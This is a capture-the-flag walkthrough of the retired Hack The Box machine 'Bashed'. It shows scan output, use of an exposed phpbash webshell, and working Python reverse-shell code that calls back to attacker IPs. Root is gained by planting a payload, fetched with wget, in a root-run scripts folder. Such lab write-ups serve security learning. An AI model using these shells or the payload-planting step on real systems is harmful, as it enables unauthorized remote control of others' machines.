
# Bashed 
https://app.hackthebox.com/machines/Bashed
![Bashed](https://user-images.githubusercontent.com/80511498/173012371-93079d00-9b84-4d07-b754-de99882d1f77.png)

ip is dynamic **Retired Machine IP:- 10.129.88.45, 10.129.88.251**

## nmap
```bash
# Nmap 7.92 scan initiated Tue Jun  7 08:29:13 2022 as: nmap -sV -sC -oA nmap_bashed -v 10.129.88.45
Nmap scan report for 10.129.88.45
Host is up (0.54s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  7 08:29:44 2022 -- 1 IP address (1 host up) scanned in 30.99 seconds

```

## dirsearch 
```bash

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.129.88.45/_22-06-07_08-35-28.txt

Error Log: /root/.dirsearch/logs/errors-22-06-07_08-35-28.log

Target: http://10.129.88.45/

[08:35:29] Starting: 
[08:35:33] 301 -  309B  - /js  ->  http://10.129.88.45/js/                 
[08:35:37] 301 -  310B  - /php  ->  http://10.129.88.45/php/               
[08:36:04] 200 -    8KB - /about.html                                       
[08:36:34] 200 -    0B  - /config.php                                       
[08:36:36] 200 -    8KB - /contact.html                                     
[08:36:38] 301 -  310B  - /css  ->  http://10.129.88.45/css/                
[08:36:40] 301 -  310B  - /dev  ->  http://10.129.88.45/dev/                
[08:36:40] 200 -    1KB - /dev/                                             
[08:36:47] 301 -  312B  - /fonts  ->  http://10.129.88.45/fonts/            
[08:36:51] 301 -  313B  - /images  ->  http://10.129.88.45/images/          
[08:36:51] 200 -    2KB - /images/                                          
[08:36:53] 200 -    8KB - /index.html                                       
[08:36:55] 200 -    3KB - /js/                                              
[08:37:10] 200 -  940B  - /php/                                             
[08:37:20] 403 -  300B  - /server-status                                    
[08:37:20] 403 -  301B  - /server-status/
[08:37:31] 301 -  314B  - /uploads  ->  http://10.129.88.45/uploads/        
[08:37:32] 200 -   14B  - /uploads/                                         
                                                                             
Task Completed 
```


## phpbash
![Pasted image 20220607084134](https://user-images.githubusercontent.com/80511498/173008186-a2f65c34-30a0-41e4-a701-72935c98bb8b.png)

## webshell

**on clicking phpbash.php it started a webshell**

![Pasted image 20220607084338](https://user-images.githubusercontent.com/80511498/173008310-b4a9bbc2-0e30-4c4a-8a45-45cbf6ed04a8.png)

## stable shell 
**now to get a stable shell i used pentestmonkey cheatsheet python reverseshell 
and using netcat i got the shell**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
```bash
nc -lvnp 1234
```
got the reverseshell
## user arrexel
**user arrexel had the user.txt**

![Pasted image 20220607085646](https://user-images.githubusercontent.com/80511498/173009601-596da2a1-9de5-4842-96f1-235125dedc2e.png)

switched user to scriptmanager using 
```bash
sudo -u scriptmanager bash -i
```
## uploading the reverse shell
saw that /scripts folder was executing text.py file 
uploaded 
python reverse shell :- 
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```python
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.32",8081))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);

```
**afterwords i uploaded it using python http server**

![Pasted image 20220607085646](https://user-images.githubusercontent.com/80511498/173010132-2ad12989-2859-4eb8-ab16-5fee60a58cca.png)


```python 
python -m http.server 80
```
**using wget downloaded the file on the target side**

![Pasted image 20220608083939](https://user-images.githubusercontent.com/80511498/173010203-6beea585-e374-4a48-8b5a-3fae6a8a66d9.png)


```python 
wget 10.10.16.32/write.py
```

**then it automatically executed just here** 
## root shell
```bash
nc -lvnp 8081
```
![Pasted image 20220608083217](https://user-images.githubusercontent.com/80511498/173010307-cc84ab51-1b82-4404-abf2-7c6ac3290cee.png)

